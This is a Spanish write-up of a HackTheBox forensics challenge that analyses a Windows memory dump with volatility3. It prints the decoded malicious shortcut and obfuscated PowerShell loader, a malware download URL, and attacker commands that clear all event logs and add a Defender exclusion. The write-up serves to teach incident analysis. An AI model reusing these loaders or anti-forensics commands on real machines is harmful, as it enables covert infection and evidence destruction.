---
title: OpTinselTrace-3
description: >
  HackTheBox Sherlocks - Medium<br>
  [Challenge Download](https://app.hackthebox.com/sherlocks/OpTinselTrace-3)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","medium","sherlock", "wireshark"]
---

 ---
### Enunciado del problema

Oh no! Our IT admin is a bit of a cotton-headed ninny-muggins, ByteSparkle left his VPN configuration file in our fancy private S3 location! The nasty attackers may have gained access to our internal network. We think they compromised one of our TinkerTech workstations. Our security team has managed to grab you a memory dump - please analyse it and answer the questions! Santa is waiting… Please note - these Sherlocks are built to be completed sequentially and in order!

---
### Instalación volatility

```python
docker pull sk4la/volatility3
 
echo 'alias "vol3"="docker run -v $PWD:/workspace sk4la/volatility3"' >> ~/.zshrc
``` 

Como se usa:
```bash
vol3 -f /workspace/YOURFILE.ext OTHER STUFF
```

Más tarde se hara una guia sobre *volatility3* en [[Volatility]]

---

Nos estan preguntando sobre el nombre de un archivo que ha sido copiado en una carpeta compartida, como nos dicen que es un volcado de memoria usamos la herramienta, *volatility3* para poder leer el dumpeo, como estamos hablando de archivos usaremos la opción: `windows.filescan.FileScan:

```bash
vol3 -f /workspace/santaclaus.bin windows.filescan.FileScan
```

Puede tardar un poco porque al final estamos leyendo todos los registros de una máquina con mucha actividad. Vemos muchos archivos pero nada entonces decidimos hacer un archivo un poco más común:

```bash
vol3 -f /workspace/santaclaus.bin windows.filescan > filescan
grep -e 'Downloads' -e 'Documents' -e 'Desktop' filescan | sort
```

---
### El problema con docker (solucionado)

Aquí nos llama la atención un archivo comprimido llamado: **present_for_santa.zip**, SIMPLEMENTE por el nombre y decidimos instalarlo para ver que contenido tiene.

```bash
vol3 -f /workspace/santaclaus.bin windows.dumpfiles --virtaddr 0xa48df8fb42a0
```

Pero si lo estas usando desde un docker nos dara este error:

```java
Volatility 3 Framework 2.5.0
Progress:  100.00		PDB scanning finished                                                                                              
Cache	FileObject	FileName	Result
Traceback (most recent call last):
  File "/usr/local/bin/volatility3", line 10, in <module>
    volatility3.cli.main()
  File "/usr/local/lib/volatility3/volatility3/cli/__init__.py", line 790, in main
    CommandLine().run()
  File "/usr/local/lib/volatility3/volatility3/cli/__init__.py", line 447, in run
    renderers[args.renderer]().render(constructed.run())
  File "/usr/local/lib/volatility3/volatility3/cli/text_renderer.py", line 193, in render
    grid.populate(visitor, outfd)
  File "/usr/local/lib/volatility3/volatility3/framework/renderers/__init__.py", line 241, in populate
    for level, item in self._generator:
  File "/usr/local/lib/volatility3/volatility3/framework/plugins/windows/dumpfiles.py", line 302, in _generator
    for result in self.process_file_object(
  File "/usr/local/lib/volatility3/volatility3/framework/plugins/windows/dumpfiles.py", line 191, in process_file_object
    file_handle = cls.dump_file_producer(
                  ^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/volatility3/volatility3/framework/plugins/windows/dumpfiles.py", line 82, in dump_file_producer
    filedata = open_method(desired_file_name)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/volatility3/volatility3/cli/__init__.py", line 682, in __init__
    fd, self._name = tempfile.mkstemp(
                     ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/tempfile.py", line 358, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/tempfile.py", line 257, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
PermissionError: [Errno 13] Permission denied: '/usr/local/tmp_yvtm8kmg.vol3'
```

Gracias a **tchemen** por compartir el archivo puedo continuar haciendo el sherlock // Thanks to **tmechen** for sharing the file to be able to continue with the sherlock:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Sherlocks%20HTB/Pasted%20image%2020240503130014.png)

Otra alma caritativa: **uomuom**,  ***DamienC*** en HTB, me ha ayudado para sacar los archivos del docker, sin tener que hacer todo el rato, que además daba problemas...

```bash
docker cp .../...:/path/docker/file.ext /path/host/file.exe
```

El comando que hay que ejecutar es el siguiente:

```bash
vol3 -f /workspace/santaclaus.bin -o /workspace/output/ windows.dumpfiles --virtaddr 0xa48df8fb42a0
```

Para cualquier momento tendremos que crear un directorio llamado *output* o como queramos y meterlo en el parametro: *-o*, esto de aquí se conoce como mapping, al final estamos igualando los dos directorios a la hora de llamar el docker, recuerda que el alias que tenemos en **vol3** en verdad es: **docker ... -v $(pwd):/workspace**, igualando ambos directorios, esto lo podemos cambiar por cualquier nombre.

No lo he probado, pero debería funcionar para todas las herramientas que necesiten y devuelvan archivos, simplemente es una buena configuración del mappeo.

---

Suponiendo que lo haces con desde el host, y descomprimes el comprimido te saldran 2 archivos:

```java
present.vbs  
click_for_present.lnk
```

Si le haces un exiftool al **click_for_present.lnk**:

```java
ExifTool Version Number : 12.57  
File Name : click_for_present.lnk  
Directory : .  
File Size : 2.6 kB  
File Modification Date/Time : 2023:11:30 15:06:40–05:00  
File Access Date/Time : 2024:01:03 14:47:09–05:00  
File Inode Change Date/Time : 2024:01:03 14:46:44–05:00  
File Permissions : -rw-r - r -   
File Type : LNK  
File Type Extension : lnk  
MIME Type : application/octet-stream  
Flags : IDList, Description, RelativePath, CommandArgs, IconFile, Unicode, ExpIcon  
File Attributes : (none)  
Target File Size : 0  
Icon Index : 70  
Run Window : Show Minimized No Activate  
Hot Key : Control-C  
Target File DOS Name : powershell.exe  
Description : Trick or treat  
Relative Path : ..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  
Command Line Arguments : -ep bypass -enc JABmAGkAbABlACAAPQAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiAEMAOgBcAFUAcwBlAHIAcwBcACIAIAAtAEYAaQBsAHQAZQByACAAIgBwAHIAZQBzAGUAbgB0ACoALgB2AGIAcwAiACAALQBGAGkAbABlACAALQBSAGUAYwB1AHIAcwBlAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABGAHUAbABsAE4AYQBtAGUAOwBjAHMAYwByAGkAcAB0ACAAJABmAGkAbABlAA==  
Icon File Name : C:\Windows\System32\shell32.dll
``` 

Claramente nos llama la atención ese código, en base64, y lo desencodeamos:

```bash
$> echo "JABmAGkAbABlACAAPQAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiAEMAOgBcAFUAcwBlAHIAcwBcACIAIAAtAEYAaQBsAHQAZQByACAAIgBwAHIAZQBzAGUAbgB0ACoALgB2AGIAcwAiACAALQBGAGkAbABlACAALQBSAGUAYwB1AHIAcwBlAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABGAHUAbABsAE4AYQBtAGUAOwBjAHMAYwByAGkAcAB0ACAAJABmAGkAbABlAA==" | base64 -d                                          

$file = Get-ChildItem -Path "C:\Users\" -Filter "present*.vbs" -File -Recurse| Select-Object -ExpandProperty FullName;cscript $file
```

Buscando algun tipo de funcion que ofusque en el archivo *present.vbs* nos dimos cuenta que esta formando una variable llamada: *A4* entonces he creado un pequeño onliner en bash para ver su contenido:

```bash
$> grep "A4" present.vbs | awk -F'"' '{print $2}' | tr -d '\n'

FunctGRINCHon WrapPresent ($EnsproglGRINCHg){$NrGRINCHngsvGRINCHrksomhedernes = $EnsproglGRINCHg.Length-1; For ($SmGRINCHths211=6; $SmGRINCHths211 -lt $NrGRINCHngsvGRINCHrksomhedernes){$MalGRINCHce=$MalGRINCHce+$EnsproglGRINCHg.SubstrGRINCHng($SmGRINCHths211, 1);$SmGRINCHths211+=7;}$MalGRINCHce;};$present=WrapPresent 'Once uhon a ttme, GRINCHntthe whpmsGRINCHcal:town o/ HolGRINCHd/y Holl7w, the7e lGRINCHve. two l7gendar4 fGRINCHgur.s know1 far a9d wGRINCHde8 the G.GRINCHnch a5d Sant2 Claus/ They desGRINCHdedeon oppssGRINCHte stdes ofrthe toon, eacy wGRINCHth _heGRINCHr ocn unGRINCHqhe charrcterGRINCHsGRINCHGRINCHcs thst defGRINCHted them. The arGRINCHnch,sa solGRINCH/ary creature,vdwelleGRINCH GRINCHn a lave at_p Mounp Crumprt. WGRINCHte hGRINCHs gseen fue and anheart teemGRINCHng.y two jGRINCHzes tpo smalg, he h';$gluhweGRINCHn=WrapPresent 'd a peGRINCHchant eor mGRINCHsxhGRINCHef a';. ($gluhweGRINCHn) (WrapPresent 'd a dGRINCH$daGRINCHn fpr anyteGRINCHng fertGRINCHve. se despesed thn joyout celebLatGRINCHonsothat echoed tarough the towGRINCH, espeoGRINCHally nurGRINCHng =he wGRINCHn$er holedays. nn the vther s:de of tolGRINCHdayeHollowm nestlpd GRINCHn ac');$FGRINCHle=WrapPresent 'cozy w\rkshoppat therNorth eole, lsved the jollynand betevolen. SantaeClaus.xWGRINCHth hes roun';. ($gluhweGRINCHn) (WrapPresent ' belly$ rosy pheeks,eand a reart bsGRINCHmmGRINCHngewGRINCHth knndnesst he spLnt hGRINCHsodays ccaftGRINCHngatoys ftr chGRINCHlGRINCHren around thn world=and sp$eadGRINCHngpcheer eherever he west. Yeae afternyear, ts the LolGRINCHdayoseasoncapproaahed, tte townGRINCHfolk eogerly nrepare+ for f$stGRINCHvGRINCHtFes, adGRINCHrnGRINCHng lhe streets wGRINCHh');. ($gluhweGRINCHn) (WrapPresent 'h lGRINCHgh.s, set GRINCHng up$decoragGRINCHons, lnd sGRINCHnuGRINCHng johful tuwes. Whele SanGRINCHa busGRINCHny prep red hGRINCH( sleGRINCHgN and ceecked wGRINCHs lGRINCHs- twGRINCHceO the GbGRINCHnch sjethed en hGRINCHs cave, GRINCHtrGRINCHtate  by thn merrGRINCHeent thtt fGRINCHll.d the wGRINCHr. One fatefbl wGRINCHntcr, a plrtGRINCHculGRINCHrly GRINCHce chGRINCHllnswept through)HolGRINCHda. HolloD, causong chaws and nGRINCHsruptlng theoholGRINCHdaa spGRINCHrGRINCHd. The FnowstoGRINCHms grel wGRINCHldee, and (he tow$sfolk ptrugglrd to keep thesr festeve tranGRINCHtGRINCHonstalGRINCHve.,ChGRINCHldr$n werepdGRINCHsappeGRINCHnted rs the srospece of a noyous telebraLGRINCHon dGRINCHomed. WctnessGRINCHag the towns dGRINCHstresso Santanknew h) had t; do soe');. ($gluhweGRINCHn) (WrapPresent 'ethGRINCHngSto restore tha holGRINCHdry cheet. WGRINCHth-a twGRINCHnPle GRINCHn rGRINCHs eyeoand a ceart fell of sope, hs decGRINCHd d to p$y a vGRINCHpGRINCHt to ehe GrGRINCHrch, hosGRINCHng toewarm hns heart and bLGRINCHng baok the cpGRINCHrGRINCHt af the teason.GRINCHGuGRINCHdedoby hGRINCHsnunyGRINCHel;GRINCH');GRINCH
```

Y como vemos ahi esta llamando a la funcion: WrapPresent, podriamos quitar todos los GRINCH que aparecen porque solo molestan en el código, pero eso es inecesario, inecesario pero la limpieza es todo:

```bash
$> grep "A4" present.vbs | awk -F'"' '{print $2}' | tr -d '\n' | sed 's/GRINCH//g'

Functon WrapPresent ($Ensproglg){$Nrngsvrksomhedernes = $Ensproglg.Length-1; For ($Smths211=6; $Smths211 -lt $Nrngsvrksomhedernes){$Malce=$Malce+$Ensproglg.Substrng($Smths211, 1);$Smths211+=7;}$Malce;};$present=WrapPresent 'Once uhon a ttme, ntthe whpmscal:town o/ Hold/y Holl7w, the7e lve. two l7gendar4 fgur.s know1 far a9d wde8 the G.nch a5d Sant2 Claus/ They desdedeon oppsste stdes ofrthe toon, eacy wth _her ocn unqhe charrcterscs thst defted them. The arnch,sa sol/ary creature,vdwelle n a lave at_p Mounp Crumprt. Wte hs gseen fue and anheart teemng.y two jzes tpo smalg, he h';$gluhwen=WrapPresent 'd a pechant eor msxhef a';. ($gluhwen) (WrapPresent 'd a d$dan fpr anyteng fertve. se despesed thn joyout celebLatonsothat echoed tarough the tow, espeoally nurng =he wn$er holedays. nn the vther s:de of toldayeHollowm nestlpd n ac');$Fle=WrapPresent 'cozy w\rkshoppat therNorth eole, lsved the jollynand betevolen. SantaeClaus.xWth hes roun';. ($gluhwen) (WrapPresent ' belly$ rosy pheeks,eand a reart bsmmngewth knndnesst he spLnt hsodays ccaftngatoys ftr chlren around thn world=and sp$eadngpcheer eherever he west. Yeae afternyear, ts the Loldayoseasoncapproaahed, tte townfolk eogerly nrepare+ for f$stvtFes, adrnng lhe streets wh');. ($gluhwen) (WrapPresent 'h lgh.s, set ng up$decoragons, lnd snung johful tuwes. Whele Sana busny prep red h( slegN and ceecked ws ls- twceO the Gbnch sjethed en hs cave, trtate  by thn merreent thtt fll.d the wr. One fatefbl wntcr, a plrtculrly ce chllnswept through)Holda. HolloD, causong chaws and nsruptlng theoholdaa sprd. The Fnowstoms grel wldee, and (he tow$sfolk ptrugglrd to keep thesr festeve trantonstalve.,Chldr$n werepdsappented rs the srospece of a noyous telebraLon domed. Wctnessag the towns dstresso Santanknew h) had t; do soe');. ($gluhwen) (WrapPresent 'ethngSto restore tha holdry cheet. Wth-a twnPle n rs eyeoand a ceart fell of sope, hs decd d to p$y a vpt to ehe Grrch, hosng toewarm hns heart and bLng baok the cprt af the teason.Gudedoby hsnunyel;');
```

Ahora nos preguntan por alguna url del atacante que tenga el virus, si lo metemos a virustotal, veremos que tiene una conexión con el host: *77.74.198.52* que también la podemos hacer si usamos volatility3 para hacer un: *windows.netscan*:

```bash
$> cat netscan | grep "77.74.198.52"

0xa48df88db790	TCPv4	192.168.68.6	49687	77.74.198.52	447	ESTABLISHED	724	svchost.exe	2023-11-30 16:42:41.000000 
```

Y virustotal nos dice que se conecta a la url: [http://77.74.198.52/destroy_christmas/evil_present.jpg](https://www.virustotal.com/gui/url/05b68f1f3205d00dbe415936c671810c1966c38f7ec180586f83254fcaf9006f) y aquí el informe de virustotal por si lo quereis ver por vosotros mismos: https://www.virustotal.com/gui/file/78ba1ea3ac992391010f23b346eedee69c383bc3fd2d3a125ede6cba3ce77243/relations

Tambien podemos ver en que puerto se conecto: hay sospechas entre el: 477 y 80, pero nos deberia salir 445 en https://www.hybrid-analysis.com/sample/78ba1ea3ac992391010f23b346eedee69c383bc3fd2d3a125ede6cba3ce77243/658442ebd046d89f69055408

Estuve hablando con otros usuarios que también hicieron la máquina y hay un bug... La siguiente pregunta se cuestiona que comando uso para limpiar todos los events logs, aqui, sin complicarse mucho hicimos un: **strings** para ver el contenido del interior y luego grepeamos por la palabra clear:

```bash
$> strings -el santaclaus.bin | grep Clear


Clear
s_apmClearAllPersistedApplicationDefaultEndpoints
StatusToClear
StatusToClear
Minimize: Cleared AC token, won't initiate soft disconnect because not connected
Minimize: Cleared AC token, won't initiate soft disconnect manually connected
Minimize: Cleared AC token, won't initiate soft disconnect in CS
Minimize: Cleared AC token, won't initiate soft disconnect because soft disconnect complete
dMinimize: Cleared AC token, won't initiate soft disconnect
	HostApplication=powershell.exe Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }
	HostApplication=powershell.exe Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }
	HostApplication=powershell.exe Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }
IsHardwarePillarDisableClearTpmButtonPolicySet
ClearHistoryButton
ClearRecentDocsOnExit
************ Clearing the FactoryRouterMap
TPM2_Clear
```

Ahora nos estan preguntando por el directorio que se excluye por el windows defender, simplemente hacemos una busqueda en el archivo por **ExclusionPath**/**Path**/**Exclusion** y variantes:

```bash
$> strings -el santaclaus.bin | grep ExclusionPath   

        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {
          [object]$__cmdletization_value = ${ExclusionPath}
	HostApplication=powershell.exe Add-MpPreference -ExclusionPath c:\users\public
```

https://labs.hackthebox.com/achievement/sherlock/1615089/580